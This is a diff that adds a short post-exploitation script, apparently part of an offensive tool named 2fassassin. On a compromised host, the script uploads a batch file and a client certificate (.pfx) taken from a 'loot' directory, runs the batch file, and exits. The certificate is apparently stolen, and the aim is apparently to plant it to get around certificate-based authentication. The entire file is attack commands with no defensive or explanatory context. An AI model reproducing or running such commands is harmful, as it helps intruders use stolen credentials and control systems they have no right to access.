@@ -1,0 +1,5 @@
+upload /root/2fassassin/cert/transport/instruction/key.bat
+upload /root/2fassassin/loot/ClientCert.pfx
+execute -f key.bat
+exit
+exit -y
